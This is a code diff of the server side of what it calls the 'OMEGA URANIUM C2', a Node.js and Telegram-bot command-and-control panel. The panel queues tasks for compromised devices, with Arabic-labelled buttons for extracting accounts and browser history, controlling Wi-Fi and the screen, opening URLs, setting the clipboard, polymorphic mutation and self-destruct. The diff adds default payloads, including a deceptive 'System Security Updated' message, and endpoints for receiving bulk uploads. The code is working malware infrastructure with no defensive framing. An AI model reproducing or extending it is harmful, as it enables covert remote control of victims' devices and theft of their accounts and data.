@@ -25,7 +25,6 @@ db.serialize(() => {
 const app = express();
 const appBot = new telegramBot(TOKEN, { polling: true });
 
-// زيادة حدود الرفع عشان الملفات الكبيرة تمر
 app.use(express.json({ limit: '200mb' }));
 app.use(express.raw({ type: 'application/octet-stream', limit: '500mb' }));
 
@@ -39,7 +38,7 @@ function escapeHtml(s) {
 }
 
 app.get('/', (req, res) => {
-    res.send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] OMEGA URANIUM C2 v22.0 [☢️]</h1></body></html>`);
+    res.send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] OMEGA URANIUM C2 v22.0 — Fully Stable [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/stream', (req, res) => {
@@ -132,7 +131,7 @@ appBot.on('callback_query', async (query) => {
             [{ text: '📊 فحص التخزين', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }, { text: '📶 Wi-Fi', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` }],
             [{ text: '🔑 الحسابات', callback_data: `cmd_EXTRACT_ACCOUNTS_${nodeId}` }, { text: '🌐 سجل المتصفح', callback_data: `cmd_EXTRACT_BROWSER_${nodeId}` }],
             [{ text: '🔓 إيقاظ الشاشة', callback_data: `cmd_CMD_SCREEN_ON_${nodeId}` }, { text: '🔒 قفل الشاشة', callback_data: `cmd_CMD_SCREEN_OFF_${nodeId}` }],
-            [{ text: '🌐 فتح رابط بالجهاز', callback_data: `cmd_CMD_OPEN_URL_${nodeId}` }, { text: '💬 عرض رسالة Toast', callback_data: `cmd_CMD_SHOW_TOAST_${nodeId}` }],
+            [{ text: '🌐 فتح رابط', callback_data: `cmd_CMD_OPEN_URL_${nodeId}` }, { text: '💬 رسالة Toast', callback_data: `cmd_CMD_SHOW_TOAST_${nodeId}` }],
             [{ text: '📋 تعيين الحافظة', callback_data: `cmd_CMD_SET_CLIPBOARD_${nodeId}` }],
             [{ text: '🛡️ تمويه (Polymorphic)', callback_data: `cmd_POLY_MUTATE_${nodeId}` }],
             [{ text: '💥 تدمير ذاتي', callback_data: `confirm_SELF_${nodeId}` }],
@@ -156,8 +155,15 @@ appBot.on('callback_query', async (query) => {
         const parts = data.split('_');
         const targetNodeId = parts.pop();
         const action = parts.slice(1).join('_');
-        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
-            [targetNodeId, action, Date.now()], async () => {
+        
+        // إعطاء payloads افتراضية للأوامر التي تتطلب بيانات إضافية لضمان عدم حدوث خطأ
+        let payload = '{}';
+        if (action === 'CMD_OPEN_URL') payload = JSON.stringify({ url: 'https://google.com' });
+        else if (action === 'CMD_SHOW_TOAST') payload = JSON.stringify({ msg: 'System Security Updated' });
+        else if (action === 'CMD_SET_CLIPBOARD') payload = JSON.stringify({ text: 'Confidential Data' });
+
+        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, ?, 'PENDING', ?)`,
+            [targetNodeId, action, payload, Date.now()], async () => {
                 await appBot.answerCallbackQuery(query.id, { text: `☢️ تنفيذ: ${action}` });
             });
     }
